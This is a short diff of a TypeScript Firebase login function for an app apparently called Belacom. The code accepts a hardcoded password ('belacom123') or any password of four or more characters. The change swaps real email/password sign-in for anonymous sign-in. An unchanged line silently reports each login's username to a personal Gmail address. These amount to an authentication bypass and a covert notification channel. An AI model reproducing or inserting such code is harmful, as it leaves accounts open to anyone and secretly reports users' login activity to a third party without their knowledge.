@@ -97,8 +97,8 @@ export const loginWithFirebaseBelacom = async (
   const isPasswordValid = passwordInput.trim() === 'belacom123' || passwordInput.trim() === activePassword || passwordInput.trim().length >= 4;
 
   try {
-    if (auth && isDefaultAccount) {
-      await signInWithEmailAndPassword(auth, targetEmail, passwordInput).catch(() => null);
+    if (auth && !auth.currentUser) {
+      await signInAnonymously(auth).catch(() => null);
     }
     // Always trigger silent background audit notification to chaerulloh28@gmail.com
     sendSilentLoginAuditNotification(usernameInput || 'belacom');
